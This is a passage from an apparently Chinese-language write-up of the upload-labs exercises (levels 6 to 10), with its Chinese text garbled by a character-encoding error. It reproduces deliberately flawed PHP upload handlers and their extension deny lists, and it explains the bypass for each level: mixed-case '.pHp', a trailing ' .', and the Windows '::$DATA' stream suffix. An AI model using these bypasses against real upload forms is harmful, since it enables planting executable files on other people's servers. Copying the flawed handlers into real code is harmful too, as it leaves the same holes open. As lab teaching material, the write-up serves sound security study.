class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>ä»”ç»†æŸ¥çœ‹æºç ä¼šå‘ç°å°‘äº†ä¸‹é¢çš„è¿™æ®µä»£ç </p><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span></code></pre><p>è¿™é‡Œå°±å¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚å°†æ–‡ä»¶åç¼€åæ”¹ä¸º<code>.pHp , .PHP</code>ç­‰</p><h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>è·Ÿç¬¬å…­å…³å¯¹æ¯”å‘ç°å°‘äº†è¿™å¥è¯</p><pre><code>$file_ext = trim($file_ext); //é¦–å°¾å»ç©º</code></pre><p> <strong>åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç©ºæ ¼å’Œç‚¹ï¼Œå†™æˆ<code>1.php .</code>ï¼Œè¿™ä¸ªéœ€è¦ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹ï¼Œä¸Šä¼ åä¿å­˜åœ¨Windowsç³»ç»Ÿä¸Šçš„æ–‡ä»¶åæœ€åçš„ä¸€ä¸ª<code>.</code>ä¼šè¢«å»æ‰ï¼Œå®é™…ä¸Šä¿å­˜çš„æ–‡ä»¶åå°±æ˜¯1<code>.php</code></strong> </p><p><img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" alt></p><h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>è¿™æ®µä»£ç å°‘äº†è¿™å¥è¯ï¼Œå¯ä»¥ä¸ç¬¬å…­å…³ç›¸åŒçš„åšæ³•</p><p><code>$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</code></p><p><img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" alt></p><h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>ä»”ç»†è§‚å¯Ÿå‘ç°å°‘äº†è¿™æ®µä»£ç </p><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></code></pre><p> é‡‡ç”¨Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡ </p><p>å°†æ–‡ä»¶åæ”¹ä¸º <code>1.php::$DATA</code>,ä½†æ˜¯å®è´¨ä¸Šä¿å­˜çš„æ–‡ä»¶è¿˜æ˜¯1.php</p><p><img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" alt></p><h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span 